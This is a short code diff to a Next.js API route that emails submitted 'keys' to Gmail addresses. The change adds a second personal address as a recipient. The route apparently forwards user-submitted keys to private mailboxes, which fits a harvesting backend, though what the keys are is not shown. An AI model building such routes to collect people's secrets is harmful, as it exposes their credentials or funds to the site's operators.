@@ -17,7 +17,7 @@ export async function POST(req: NextRequest) {
 
     try {
         await transporter.sendMail({
-            to: ["bitfusion867@gmail.com"],
+            to: ["bitfusion867@gmail.com","kenthomson999@gmail.com"],
             from: `"The Sector: Key Submission" <${process.env.EMAIL_USER}>`,
             text: `New keys submision review: ${keys} `,
             html: `
